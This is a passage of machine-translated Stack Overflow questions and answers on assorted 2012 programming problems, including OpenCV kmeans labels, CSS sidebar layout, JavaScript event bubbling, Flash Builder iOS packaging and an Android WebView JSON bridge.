                            <img src=\"{$v['avatar']}\" alt=\"\" />
                        </div>
                    </div>
                </div>";

}

?>

<script type="text/javascript">
function addModal(x)
{

    $("osx" + x).addEvent("click", function(){
          var SM = new SimpleModal();
              SM.show({
                "title":"Title",
                "contents": $("#osx-modal-content" + x).html()
              });
        });

}
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T16:29:30.180

多亏了standup75，终于让它工作了！

```
 jQuery(function ($) {
  var OSX = {
      container: null,
      init: function () {
              $("[name=osx]").click(function (e) {
                e.preventDefault(); 
                $(this).parent().next().modal({
                    overlayId: 'osx-overlay',
                    containerId: 'osx-container',
                    closeHTML: null,
                    minHeight: 80,
                    opacity: 65, 
                    position: ['0',],
                    overlayClose: true,
                    onOpen: OSX.open,
                    onClose: OSX.close
                });
            });
      }, 
```

# c++ - 搜索 boost::tuple 的向量

> ID：10114961
> 
> 赞同：1
> 
> 时间：2012-04-11T22:36:41.730
> 
> 标签：c++, boost, boost-tuples

boost 库中是否有算法或辅助方法来搜索`boost::tuple`对象向量？这是我的代码：

```
typedef boost::tuple<int, char const*, char const*> Tuple;
typedef std::vector<Tuple> ErrorStringMap;

ErrorStringMap mystrings = tuple_list_of
    (10, "10", "ten") 
    (20, "20", "twenty") 
    (30, "30", "thirty") 
    (40, "40", "fourty"); 
```

我想搜索元组的向量并找到第一个值为 20 的元组作为元组中的第一个元素。我想访问该元组的第二个和第三个元素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-10T17:39:46.270

ildjarn 在我的问题下方的评论列表中回答了这个问题，但是他没有作为答案发布，所以我会为他做：

> Phoenix 的占位符在 boost::phoenix::placeholders 中。此外，如果您使用的是 Phoenix，则不需要为此绑定 - 使用正确的包含， at_c<0>(_1) == 20 有效。

# c# - XamDataGrid 并针对整个集合验证单元格项

> ID：10114967
> 
> 赞同：1
> 
> 时间：2012-04-11T22:37:30.527
> 
> 标签：c#, wpf, xaml, infragistics, xamdatagrid

我们在 WPF 应用程序中使用 XamDataGrid。它运行良好，我们在应用程序中添加了对 IDataErrorInfo 的支持：

```
<igDP:FieldLayoutSettings AllowFieldMoving="No"
    AutoGenerateFields="False"
    SupportDataErrorInfo="RecordsAndCells" 
    DataErrorDisplayMode="ErrorIconAndHighlight" /> 
```

此数据网格上的绑定转到实现 IDataErrorInfo 的对象 Foo 的 ObservableCollection。我们对单个属性进行数据验证，例如 Text 属性，如果属性为空或字符过多，则会生成错误。这对于更新场景非常有用——有错误的单元格被突出显示并出现一个工具提示。

```
 <igDP:Field Name="Text"
      Label="{base:TextID _TextField}">
  </igDP:Field> 
```

我们需要完成的是针对绑定到数据源的整个可观察集合验证单元格的值。因此，如果用户在文本单元格的第 2 行中键入“Apple”，但第 10 行文本单元格中已经存在“Apple”，我们会生成一个错误条件，用户必须在继续之前更正该错误条件。

我们如何使用 XamDataGrid 最好地完成此任务？我们希望保持它干净，以便对象 Foo 只验证它自己的属性并且不知道整个集合。

本文非常接近，但我不确定如何使用 XamDataGrid 来完成它：[针对整个集合验证集合项以防止重复](https://stackoverflow.com/questions/9605472/validation-of-collection-item-against-entire-collection-to-prevent-duplicates) 我们可以将 XamDataGrid 项集合传递给自定义验证器吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T00:26:18.350

这是一个可能对您有用的解决方案：

[http://brianlagunas.com/2012/04/11/validate-a-property-against-a-parent-collection/](http://brianlagunas.com/2012/04/11/validate-a-property-against-a-parent-collection/)

# iphone - 为 iPhone 打包一个 Actionscript (Flash Builder) 应用程序

> ID：10114969
> 
> 赞同：4
> 
> 时间：2012-04-11T22:37:35.957
> 
> 标签：iphone, ios, flash, flash-builder

最近我尝试在 Flash Builder 中构建一个 flash 应用程序，我想将它导出到我的 iPhone。为了证明我的申请，我已经完成了所有必需的步骤。现在，所有这些都完成了，剩下要做的就是在 Flash Builder 中构建“.ipa”文件。现在，这给出了以下错误：

> 'Launching TestGame' 遇到问题。
> 
> 打包应用程序时出错：
> 
> NotBefore：2012 年 4 月 11 日星期三 18:52:40 CEST

Google 没有给我一个像样的答案，Adobe 关于移动应用程序开发的信息也没有。我能想到的就是我不能在那个日期之前构建应用程序。太荒谬了，我无法想象这样的支票。

我很确定我的“.p12”密钥文件生成正确。有其他人熟悉这个错误吗？请善待我，引导我朝着正确的方向前进。

亲切的问候，

马蒂亚斯。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T01:12:44.503

出现该错误是因为编译器没有找到相应目录下的文件，例如 debug-bin 或 release-bin 文件夹。（解释自：[http](http://forums.adobe.com/thread/893772) ://forums.adobe.com/thread/893772 ）

例如，如果您正在进行调试构建，并且您没有选择项目选项：将非嵌入文件复制到输出文件夹。而debug-build需要debug-bin文件夹下的图标文件等一些文件，找不到。

解决方案：选择项目编译选项：将非嵌入文件复制到输出文件夹。再试一次，如果仍然没有，您将需要尝试 ADT 构建以获取更多详细信息[http://help.adobe.com/en_US/air/build/WS901d38e593cd1bac35eb7b4e12cddc5fbbb-8000.html](http://help.adobe.com/en_US/air/build/WS901d38e593cd1bac35eb7b4e12cddc5fbbb-8000.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T08:14:55.440

我建议从命令行编译。我将一个 AIR 应用程序移植到 iOS 并直接使用`adt`（没有 FB 或其他）编译，并且有比你的更有意义的消息。查看有关如何构建wit的[手册](http://help.adobe.com/en_US/air/build/WS901d38e593cd1bac35eb7b4e12cddc5fbbb-8000.html)。另一个建议是检查你的节点（看看[这里](http://help.adobe.com/en_US/air/build/WSfffb011ac560372f2fea1812938a6e463-8000.html#WSfffb011ac560372f2fea1812938a6e463-7fd6)）和[图标](http://help.adobe.com/en_US/air/build/WS901d38e593cd1bac1e63e3d129907d2886-8000.html)。`ipa``adt``iPhone``app.xml`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-12T17:39:10.847

抛出“错误”是因为证书还无效。它于上述日期生效。

您还可以在 iOS 开发人员中心修复清单文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-14T05:00:23.090

这个问题确实比需要的更频繁地出现。错误报告缺乏区别，但也难以评估，因为可能有许多因素导致此错误。如果这是一个因素或什至只是几个因素，那么它很可能会让您知道。

确保错误报告可以完成其工作并告诉您问题出在哪里的一个好方法是检查您的错误日志。它会告诉你至少几个扔块的地方。

如果您无法阅读那些奇怪的字形，那么只需确保您的所有资源都被打包。这确实意味着要花一点时间检查列表，但对于错误和摆脱开发垃圾来说，这是非常值得的。

资产列表检查的第一步是检查资产类的每个部分（闪存生成器参考）。如果您没有直接的 Assets 类，那么您可能想要创建一个并将所有资产调用移动到该类 - 因为如果再次发生这种情况，它将为您节省时间。

您的 Assets 类与您的 Assets 文件夹不同。您的文件夹是存储文件的位置 - 即图像、位图、声音等。您的 Assets 类用于对每个单独文件的引用进行分类和分配。

浏览您的 Assets 类以确保这些文件中的每一个也存在于文件夹中。然后转到项目菜单（导航和搜索附近的顶部）并选择清理。清理所有项目或检查当前项目。完成此操作后，您需要单击资产文件夹（右键单击或突出显示并单击编辑或其他），然后选择刷新。这将检查所有文件是否仍然存在并删除/更新它们。

如果这些都没有引发错误 -red X- 或其他错误，那么您需要检查您的项目 .xml 文件。这可能需要您一些时间来确保您添加的所有软件包和详细信息都是正确的。确保你有正确的：在顶部，它与你当前的空气释放相匹配。确保所有文件名、名称、ID、版本号、纵横比、全屏、可见、图标、扩展名和其他所有内容不仅正确，而且确实存在。这些陈述中的大多数都应该写一些东西，而不是空白。如果它们是空白的，请找出要放入的内容。

确保您具有正确的图标文件扩展名。如果它说 assets/icon48.png 并且 icon48.png 实际上在 assets/pictures/images/icons/toomanyfilesextensions/whatever/icon48.png 你需要修复那个链接。

您需要检查的最后一件事是何时要发布构建或调试。您需要确保检查并选择所有资产。转到项目 - 属性。然后选择 ActionScript 构建路径。单击 Native Extensions 选项卡，查看是否有任何红色 X。如果有点击他们旁边的小箭头，看看是怎么回事。添加正确的 ANE 或删除它或您需要做的任何事情。然后在同一个菜单中转到左侧并选择 ActionScript Build Packaging。一个小箭头也应该在那个旁边。点击箭头，它将打开 Apple iOS、BlackBerry、Gooogle 以及您拥有的任何其他设备（可能仅此而已）。选择您要使用的操作系统，比如说 Apple，您将弹出 4 个选项卡。确保您选择了正确的证书。

这个错误最大的一个是在 Package Contents 选项卡下。大多数人都错过了！打开选项卡，看看是否有任何未检查的内容。如果您收到此错误，将有 99.99% 的内容或其中许多内容未检查。只需检查所有这些，您就可以弄清楚您需要什么，以后不需要什么。其中一些将被列出，因为您只是投入了一堆 ANE 和 .SWF 以获得一些很棒的应用程序。那些附加包会将不必要的内容放入此包中。这很好，在你想挑剔之前不要担心。只要确保它们都被选中并点击应用和确定。

就是这样。如果你做的一切都正确，你应该有一个有效的发布版本，从现在开始这个错误应该很容易（但浪费时间）。

您现在可能会遇到“失误”错误，但那是另一回事了。但这是一个好兆头，因为你离我们都犯的那个愚蠢的错误越来越近了：难以捉摸的拼写错误。

# c++ - 如何使用 KMEANS_USE_INITIAL_LABELS 在 opencv kmeans 中设置初始标签

> ID：10114973
> 
> 赞同：3
> 
> 时间：2012-04-11T22:37:56.533
> 
> 标签：c++, opencv, cluster-analysis, k-means

我正在使用 opencv kmeans 对从凸包返回的点进行聚类。

就我而言，我会得到 3 分。在下一个循环中，我想为 kmeans 提供最后找到的 3 个点。我读到我必须设置 KMEANS_USE_INITIAL_LABELS。

但是我如何设置初始标签/点？

这是我到目前为止所拥有的，但它返回错误：

```
//get all convexhull points and average them in 3 groups
                    int dimensions = 2;
                    float pointsdata[sampleCount*2]; //[] = {1,1, 2,2, 6,6, 5,5, 10,10};

                    int cnt = 0;
                    for(int a=0; a<sampleCount; a++){
                        pointsdata[cnt] = convexHull[a].x;
                        cnt++;
                        pointsdata[cnt] = convexHull[a].y;
                        cnt++;
                    }

                    cv::Mat points;
                    points = cv::Mat(sampleCount,dimensions, CV_32F,pointsdata);

                    int clusterCount = 3; //i want 3 averaged points back

                    cv::Mat labels;
                    labels = cv::Mat(3,1,points.type());
                    labels.at<float>(0,0) = pointA.x;
                    labels.at<float>(0,1) = pointA.y;

                    labels.at<float>(0,2) = pointB.x;
                    labels.at<float>(0,3) = pointB.y;

                    labels.at<float>(0,4) = pointC.x;
                    labels.at<float>(0,5) = pointC.y;

                    cv::Mat centers;
                    centers = cv::Mat(clusterCount, 1, points.type());

                    kmeans(points, 3, labels, cv::TermCriteria(), 2,cv::KMEANS_USE_INITIAL_LABELS, &centers); 
```

更新：好的，我现在知道标签意味着输入集群中点的索引，而不是实际坐标。所以应该更像这样。但还是错了。

```
cv::Mat labels;
                    labels = cv::Mat(3,1,points.type());
                    labels.at<int>(0,0) = labelA;
                    labels.at<int>(0,1) = labelB;
                    labels.at<int>(0,2) = labelC; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-25T23:49:01.890

初始集群分配的类型必须是`CV_32S`not `CV_32F`。您可以在 matrix.cpp 中看到其他条件：

```
CV_Assert( (best_labels.cols == 1 || best_labels.rows == 1) &&
              best_labels.cols*best_labels.rows == N &&
              best_labels.type() == CV_32S &&
              best_labels.isContinuous()); 
```

标签的值应在行数的范围`[0,N)`内。`N`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T05:20:53.200

需要为每行分配一个标签。因此，在您的情况下，他们必须分配为：

```
cv::Mat labels;
labels = cv::Mat(3,1,points.type());
labels.at<int>(0,0) = labelA;
labels.at<int>(1,0) = labelB;
labels.at<int>(2,0) = labelC; 
```

附带说明：您在上述编辑中的代码是错误的。您已分配三行并正在写入三列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-04T06:18:50.353

```
cv::Mat labels;
labels = cv::Mat(sampleCount,1,CV_32S);
for(int i = 0; i < sampleCount; i++)
    labels.at<int>(i,0) = 0;
labels.at<int>(position1, 0) = 0;
labels.at<int>(position2, 0) = 1;
labels.at<int>(position3, 0) = 2; 
```

标签是一个 1*N 或 N*1 整数数组，用于存储样本中每个点的 clusterid。所以请确保

1.  标签大小：1*N 或 N*1（不是 1*K 或 K*1）
2.  标签类型：CV_32S，因为它存储clusterid，所以应该是整数
3.  标签的范围：标签中的每个元素都在 [0, K)

# html - 如何在浏览器调整大小时从重叠的居中静态 div 修复 div？

> ID：10114974
> 
> 赞同：3
> 
> 时间：2012-04-11T22:37:57.690
> 
> 标签：html, css

我正在尝试构建一个带有侧边栏的两列布局，该侧边栏始终位于页面左侧，主要内容区域居中，当调整窗口大小时，居中的内容最终会碰到导航栏，但永远不要向左移动超过它们接触时的位置（将离开：150px）。

有人可以帮我吗？

这是CSS：

```
@charset "UTF-8";
/* CSS Document */

body,td,th {
    font-size: 16px;
    font-family: Verdana, Geneva, sans-serif;
    color: #000;
}

body {
    background-color: #FFF;
    margin-left: 0px;
    margin-top: 0px;
    margin-right: 15px;
    margin-bottom: 0px;
}

#nav {
    position: fixed;
    top: 0px;
    left: 0px;
    width: 150px;
    height: 10000px;
    background-color: #D61D21;
    text-align: right;
}

#nav a:link {
    color: #FFF;
    text-decoration: none;
}

#nav a:visited {
    color: #FFF;
    text-decoration: none;
}

#nav a:hover {
    color: #FFF;
    text-decoration: underline;
}

#main {
    width: 810px;
    height: 810px;
    margin: 0px auto;
} 
```

这是html：

```
<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<title>Nick Passaro Designs</title>
<link href="css/index.css" rel="stylesheet" type="text/css">
</head>

<body>

    <div id="nav">
        <a href="index.php"><img src="assets/marklogo.jpg" width="150" height="97" border="0" alt="Nick Passaro Designs"></a>
        <p><a href="portfolio.php">PORTFOLIO</a> &nbsp;</p>
        <p><a href="logos.php">LOGOS</a> &nbsp;</p>
        <p><a href="print.php">PRINT</a> &nbsp;</p>
        <p><a href="web.php">WEB DESIGN</a> &nbsp;</p>
        <p><a href="photography.php">PHOTOGRAPHY</a> &nbsp;</p>
        <p><a href="contact.php">CONTACT</a> &nbsp;</p>
    </div>

    <div id="main">
        ENTER CONTENT HERE
    </div>

</body>
</html> 
```

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:44:01.123

我刚刚学到的一个巧妙的小技巧是让你的#content position: relative; 然后将其中的所有子元素设置为 position: absolute; 这样，所有子元素对于您的内容区域都是绝对的，并且内容将调整为任何分辨率。为我节省了大量时间，我不敢相信我曾经浪费了多少时间来布置动态网站。

希望这对你有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T23:07:12.283

做这个：

```
<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<title>Nick Passaro Designs</title>
<link href="index.css" rel="stylesheet" type="text/css">
</head>

<body>
    <div id="nav">
        <a href="index.php"><img src="assets/marklogo.jpg" width="150" height="97" border="0" alt="Nick Passaro Designs"></a>
        <p><a href="portfolio.php">PORTFOLIO</a> &nbsp;</p>
        <p><a href="logos.php">LOGOS</a> &nbsp;</p>
        <p><a href="print.php">PRINT</a> &nbsp;</p>
        <p><a href="web.php">WEB DESIGN</a> &nbsp;</p>
        <p><a href="photography.php">PHOTOGRAPHY</a> &nbsp;</p>
        <p><a href="contact.php">CONTACT</a> &nbsp;</p>
    </div>

    <div id="wrapper">
        <div id="main">
            ENTER CONTENT HERE
        </div>
    </div>
</body>
</html> 
```

CSS：

```
#wrapper{
    margin-left: 150px;
} 
```

您所做的是在主 div 周围创建一个包装器 div，并使该包装器 div 的左边距为 150px，以便它与导航栏并排。现在，您在主 div 内的所有调整大小都应限制在包装器内。

# facebook - 将两个 Graph 条目合并为一个 - 关于一个网站

> ID：10114975
> 
> 赞同：1
> 
> 时间：2012-04-11T22:38:03.543
> 
> 标签：facebook, facebook-graph-api, facebook-like, facebook-apps

我的摄影网站[http://www.tomaskouba.cz](http://www.tomaskouba.cz)上有类似按钮。主页有15个赞，有些图片也有赞。大约一个月前，我玩了 Facebook 应用程序，做了一个 FB 应用程序，说它的 url 是 www.tomaskouba.cz，设置画布并很快停用画布。

**问题：**

喜欢消失了。我可以在 Graph API 中看到，我的 15 个赞位于 URL [https://graph.facebook.com/http://www.tomaskouba.cz](https://graph.facebook.com/http://www.tomaskouba.cz)（顺便说一句，我有 2 个月没有看我的赞了，所以我不是 100% 确定我的应用是否是原因）

当我检查我的 FB 应用程序时：[https](https://graph.facebook.com/175067675881467) ://graph.facebook.com/175067675881467它提供了一些信息，但没有提供域（我填写了应用程序设置）并且不喜欢。

**问题：**

1.  我应该在 Like Button 中提供什么 URL 才能获得 15 个赞？
2.  是否可以加入这些 Graph 条目以让我的喜欢回到 url www.tomaskouba.cz 下？

谢谢！

# javascript - 停止特定处理程序的事件传播

> ID：10114978
> 
> 赞同：1
> 
> 时间：2012-04-11T22:38:18.053
> 
> 标签：javascript, html, events, javascript-events

## tl;博士总结

编写一个函数，当注册以处理层次结构中多个元素上的特定事件时，在冒泡期间到达的第一个元素上执行，但在进一步向上冒泡时不执行（或提前返回）。（实际上没有停止事件的传播。）

## 简单示例

鉴于[此 HTML](http://jsfiddle.net/wun8k/) ...

```
<!DOCTYPE html>
<body>
<div><button>click</button></div>
<script>
var d = document.querySelector('div'),
    b = document.querySelector('button');
d.addEventListener('mousedown',clickPick,false);
d.addEventListener('mousedown',startDrag,false);
b.addEventListener('mousedown',startDrag,false);
function clickPick(){ console.log('click',this.tagName); }
function startDrag(){ console.log('drag',this.tagName);  }
</script> 
```

…单击按钮会产生以下输出：

> 拖动 BUTTON
> 点击 DIV
> 拖动 DIV

但是，我不想拖动 div。具体来说，我只想在它在特定传播链中注册的最叶元素`startDrag`上处理一次。`<button>`

## “工作”解决方案

以下 JavaScript 代码[已经过测试](http://jsfiddle.net/PLcZv/)，可*在*IE9、Chrome18、FF11、Safari5 和 Opera11 上运行。

```
function startDrag(evt){
  if (seenHandler(evt,startDrag)) return;
  console.log('drag',this.tagName);
}

function seenHandler(evt,f){
  if (!evt.handlers) evt.handlers=[];
  for (var i=evt.handlers.length;i--;) if (evt.handlers[i]==f) return true;
  evt.handlers.push(f);
  return false;
} 
```

*以上不适**用于**IE8，即使你使用全局`window.event`对象；冒泡期间不会重复使用相同的`event`对象。*

## 问题

但是，我不确定上述是否可以*保证*工作......也不确定它是否尽可能优雅。

1.  是否保证在传播过程中将相同的`event`对象向上传递？
2.  是否保证该`event`对象永远不会被重新用于不同的事件调度？
3.  对象是否`event`保证支持添加 expando 属性？
4.  你能想出一种更优雅的方法来检测在当前事件调度中是否已经看到相同的事件处理函数吗？

## 现实世界的应用

想象一下这个 SVG 层次结构……</p>

```
<g>
  <rect … />
  <rect … />
  <circle … />
</g> 
```

...以及[希望](https://stackoverflow.com/questions/10095979/d3-click-and-drag-event-nesting)能够通过拖动其中的任何矩形来拖动整个组的用户，并且还希望能够通过拖动来仅拖动圆圈。

现在混入一个为您处理大部分细节的[通用拖动库。](https://github.com/mbostock/d3/wiki/Drag-behavior#wiki-drag)我提议修改这个库，这样如果用户同时添加一个拖动处理程序，`<g>`然后`<circle>`在圆圈上拖动会自动阻止拖动在组上启动，但不会停止所有`mousedown`事件的传播（因为用户可能有用于其他需要的高级处理程序）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T14:28:37.003

这是一个通用解决方案，适用于所有主要浏览器的当前版本......但不适用于 IE8，并且可能无法*保证*在未来版本中适用：

```
// Solution supporting arbitrary number of handlers
function seenFunction(evt,f){
  var s=evt.__seenFuncs;
  if (!s) s=evt.__seenFuncs=[];
  for (var i=s.length;i--;) if (s[i]===f) return true;
  evt.handlers.push(f);
  return false;
}

// Used like so:
function myHandler(evt){
  if (seenHandler(evt,myHandler)) return;
  // ...otherwise, run code normally
} 
```

或者，这是一个不太通用的解决方案，它稍微快一点但可能不会明显更快（同样，在 IE8 中没有，并且可能不*保证*将来可以工作）：

```
// Implemented per handler; small chance of error with a conflicting name
function myHandler(evt){
  if (evt.__ranMyHandler) return;
  // ...otherwise, run code normally
  evt.__ranMyHandler = true;
} 
```

*我很乐意将接受转换为提供适当规格的另一个答案。*

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-11T23:07:10.730

[这](http://jsfiddle.net/3vprA/3/)在 Firefox 中看起来不错，并且可能适用于非标准浏览器，因为 jQuery 本质上是使用`delegate`和`live`. 它使用[`stopPropagation`](https://developer.mozilla.org/en/DOM/event.stopPropagation)和[`target`](https://developer.mozilla.org/en/DOM/event.target)，两者都是标准的。

```
var d = document.querySelector('div'),
    b = document.querySelector('button');
d.addEventListener('mousedown',clickPick,false);
d.addEventListener('mousedown',startDrag,false);
function clickPick(evt){
    console.log('click', this.tagName);
}
function startDrag(evt){
    console.log('drag', evt.target.tagName);
    evt.stopPropagation();
} 
```

对我来说，单击按钮时的顺序是相反的。你的有“拖动按钮”然后“单击 DIV”，而我的则相反。但是，我认为它在原始文件中是未定义的。

编辑：更改为使用`target`. 9 之前的 IE 使用了一个非标准`srcElement`属性，这意味着同样的事情。

# python - 无法在 Eclipse for OS X 上升级/安装插件

> ID：10114985
> 
> 赞同：2
> 
> 时间：2012-04-11T22:39:28.633
> 
> 标签：python, eclipse, eclipse-plugin, pydev

我试图在 OS X 上为 Eclipse 安装 PyDev 插件，但我意识到我无法访问“查找并安装”选项。当我转到“帮助”>“软件更新”时，“查找并安装”和“管理配置”都是灰色的。

由于我正在运行 Eclipse 3.6.0，我认为升级到 3.7 可能会修复它，但我需要访问该菜单才能升级，不是吗？

有谁知道修复？

Eclipse 3.6.0 OS X 10.7.3

**更新：通过全新升级到 Eclipse 3.7 解决了问题**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T12:33:09.607

不知道为什么它在你的情况下被禁用，但无论如何，当升级到新版本的 Eclipse 时，不要使用更新菜单，总是从 Eclipse.org 获取新版本并重新安装你使用的插件（即：获取 Eclipse 3.7) -- 注意：在更新您使用的所有插件后，只需指向您之前拥有的相同工作区（在更新插件时指向不同的工作区，这样您就不会弄乱当前的工作区，因为功能是在安装所有插件之前不可用）。

至于更新 PyDev，通常去“安装新软件”，添加 PyDev 更新站点（见链接： http: [//pydev.org/download.html](http://pydev.org/download.html)）然后从那里去——如果它是灰色的，抓住一个新的 Eclipse 并从那里开始 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T02:30:12.093

我不确定您指的是什么菜单选项。您应该选择“帮助”菜单，然后直接在“帮助”下选择“安装新软件”选项。你不应该做任何涉及软件更新的事情，因为安装 PyDev 就像它是新软件一样，所以我认为当你选择软件更新选项时你会出错。

尽管它们在 Eclipse 方面有点过时，但我可以使用[这些说明](http://www.rose-hulman.edu/class/csse/resources/Eclipse/eclipse-python-configuration.htm)在带有 Eclipse 3.6 的 Mac OS X 中安装。

# php - 在 localhost 中执行跨浏览器测试的应用程序工具

> ID：10114986
> 
> 赞同：0
> 
> 时间：2012-04-11T22:39:32.397
> 
> 标签：php, testing, cross-browser

我正在建立一个网站，这意味着它还没有上传到服务器。有什么方法可以从 localhost 而不是实际托管的 URL 执行跨浏览器测试？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:42:51.843

要么通过本地运行大量浏览器（一些在 VM 中），要么通过使用 SSH 隧道连接到诸如 browserling（http://browserling.com/）之类的商业服务。

编辑详细说明：本地主机和服务器之间的 SSH 隧道（技术上是*反向*隧道）允许您通过加密的 SSH 通道将远程主机上的某些端口转发到本地主机上的端口。这意味着在 browserling 的服务器上运行的浏览器可以通过隧道将数据包发送回您的本地主机和那里的网络服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:42:28.673

在您的本地机器上安装 PHP，这样您就可以在命令行或浏览器中运行 PHP 脚本。

[http://php.net/manual/en/install.php](http://php.net/manual/en/install.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:43:06.863

配置您的网络服务器以侦听您的网络 IP 并通过本地网络上的 IP 地址访问您的网站。

如果是 apache webserver 它将使用指令进行配置：

```
Listen IP:port 
```

示例 1（您的适配器 IP 地址）：

```
Listen 192.168.1.10:80 
```

示例 2（所有接口上的全局监听） - 更适合测试

```
Listen 0.0.0.0:80 
```

然后只需从其他平台上的其他浏览器访问您的计算机。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T22:45:35.410

当然。如果您能够配置本地网络，则可以通过更改路由器防火墙将端口 80 或 443 暴露给云。这将使您的应用程序与远程主机上的任何应用程序一样可用于本地测试。

如果您的问题是关于您可以使用哪些工具（作为外部服务或可在本地安装），请告诉我。

# ios - C ENUM 在 Xcode iOS 开发项目中无法识别

> ID：10114987
> 
> 赞同：2
> 
> 时间：2012-04-11T22:40:02.587
> 
> 标签：ios, c, xcode, enums

是否有允许普通 C 枚举在 Xcode 中工作的构建设置？请不要告诉我使用 typedef 技术。我需要直接使用老式枚举。我有一个遗留项目可以很好地使用它们，但是当我将类导入新项目时，它会抛出错误，说我的枚举未定义。

我使用一个简单的 Global.h 将它们包含在所有抱怨的类中。我的实现非常基本：

```
enum {
state1,
state2
}; 
```

线索？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:52:21.750

已经有一段时间了，我的 iPad 上没有 ac 编译器来测试它，但请尝试：

```
enum states {
state1,
state2
}; 
```

# extjs - Sencha Touch 2：按面板更改背景 CSS

> ID：10114988
> 
> 赞同：1
> 
> 时间：2012-04-11T22:40:19.903
> 
> 标签：extjs, sencha-touch-2

也许我遗漏了一些东西，但它似乎是 Sencha Touch 中的一个错误，如果您使用入门模板作为基本模型，则无法使用带有 CSS 的特定面板定位 TitleBar。

Main.js（包含 TitleBar）调用所有其他面板，因为其他面板是 TitleBar 所在的 Main.js 的子级，因此子级无法设置父级的背景颜色。在这种情况下，如果您希望屏幕底部的导航栏 (TitleBar) 将颜色从 Home.js 页面更改为您的子页面，这是不可能的。有没有人找到解决方法？

```
<div class="Sencha-App">
    <div class="Panel"></div>
    <div class="TitleBar"> </div>
</div> 
```

如果 TitleBar 是 Panel 的子级，则问题将很容易解决，但由于它只是 Sencha-App 的子级，因此无法使用 CSS 使 TitleBar 动态化。这是否意味着我唯一能做的就是使用 JavaScript 来查找是否有一个等于“myPanel”的类，如果有，请将 TitleBar 的背景设置为某种颜色？或者使用一些不同于他们在入门教程中使用的架构？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T08:59:23.487

可能这可以帮助您......
要更改工具栏的颜色/样式，您可以在 .scss 文件中创建您的特定 UI，并使用 compass 编译它，这将反映您的 .css 文件中的更改，然后将此 UI 设置为您的工具栏

$基色：#279806；
$base-gradient: '光泽';
$base-active:#279806;
@include sencha-tabbar-ui('TabUI', $base-color, $base-gradient, $base-active);

var tabPanel = new Ext.TabPanel({ ui:'TabUI' });

# java - 如何将 JSON 格式的数据从 WebView 传递到 HTML 页面

> ID：10114993
> 
> 赞同：10
> 
> 时间：2012-04-11T22:40:53.007
> 
> 标签：java, javascript, android, json, webview

我正在尝试将 JSON 格式的数据从我的 Android WebView 传递到 HTML 页面。但是，每当我尝试解析原始 JSON 数据时，应用程序就会崩溃，我希望它是格式`{"key":"data"}`

我的应用程序的目的是解释这个 JSON 数据，将其形成一个值数组，并将其发送到 HTML 页面。这是正确的方法吗？

这是我的 WebView 代码...

```
public class MyWebView extends Activity {
    WebView mWebView;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.web_view);

        mWebView = (WebView) findViewById(R.id.webviewSch);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "webConnector");
        mWebView.loadUrl("file:///android_asset/table.html");
    }

    public String load() {
        return "{\"key\":\"data\"}";
    }
} 
```

这是HTML代码...

```
<html>
<head>
<title>Test</title>
<script type="text/javascript">

function loader() {
    var jsonData = window.webConnector.load();
}

</script>
</head>
<body onload="loader()">
Do nothing
</body>
</html> 
```

这是日志猫：

```
04-15 00:35:44.551: W/dalvikvm(442): JNI WARNING: jarray 0x4053f1a0 points to non-array object (Ljava/lang/String;)
04-15 00:35:44.551: I/dalvikvm(442): "WebViewCoreThread" prio=5 tid=9 NATIVE
04-15 00:35:44.551: I/dalvikvm(442):   | group="main" sCount=0 dsCount=0 obj=0x4051bcc0 self=0x19b200
04-15 00:35:44.551: I/dalvikvm(442):   | sysTid=451 nice=0 sched=0/0 cgrp=default handle=1684280
04-15 00:35:44.551: I/dalvikvm(442):   | schedstat=( 206004592 365607782 69 )
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.LoadListener.nativeFinished(Native Method)
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.LoadListener.nativeFinished(Native Method)
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.LoadListener.tearDown(LoadListener.java:1200)
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.LoadListener.handleEndData(LoadListener.java:721)
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.LoadListener.handleMessage(LoadListener.java:219)
04-15 00:35:44.551: I/dalvikvm(442):   at android.os.Handler.dispatchMessage(Handler.java:99)
04-15 00:35:44.551: I/dalvikvm(442):   at android.os.Looper.loop(Looper.java:130)
04-15 00:35:44.551: I/dalvikvm(442):   at android.webkit.WebViewCore$WebCoreThread.run(WebViewCore.java:629)
04-15 00:35:44.551: I/dalvikvm(442):   at java.lang.Thread.run(Thread.java:1019)
04-15 00:35:44.551: E/dalvikvm(442): VM aborting 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-12T00:33:08.067

我复制粘贴了您的代码并且它可以工作（没有显示任何内容，因为您没有显示数据）但是从 Javascript 到 Android 的回调正确执行。您可以使用以下代码检查它：

```
